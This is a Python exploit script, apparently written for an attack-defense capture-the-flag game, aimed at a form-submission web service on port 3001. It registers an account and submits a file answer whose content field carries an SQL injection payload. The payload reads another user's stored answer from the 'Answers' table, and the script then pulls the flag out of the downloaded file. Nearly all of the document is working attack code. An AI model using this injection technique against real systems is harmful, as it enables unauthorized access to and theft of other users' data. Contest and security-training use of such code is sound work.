from utils import *
import sys
import json
import re
import jwt

PORT = 3001

def exploit(ip, flag_id):
    client = ClientSession(ip, PORT)
    client.register()

    form = client.new_form(form = {
        "title": random_string(5, 20),
        "questions": [{"type": "file", "question": random_string(5, 20)}],
    })


    ans = client.submit_answer(form, answers=[{
        'name': random_string(5, 20, string.ascii_letters + string.digits),
        'content': b64.b64encode(random_string(5, 20).encode()).decode() + f"' || (SELECT string_agg(answer, ',') FROM \"Answers\" WHERE id='{flag_id['answer_id']}'),'escape')) -- "
    }])

    answers = client.get_answers(form)

    file_id = answers[0]['answer'][0]['file_id']
    file = client.get_file(file_id)

    m = re.search(rb"[A-Z0-9]{31}=", file)
    if m is None:
        raise Exception("Failed to find flag in " + file)
    
    flag = m.group(0).decode()
    return flag

if __name__ == "__main__":
    ip = sys.argv[1]
    flag_id = json.loads(sys.argv[2])
    print(exploit(ip, flag_id))
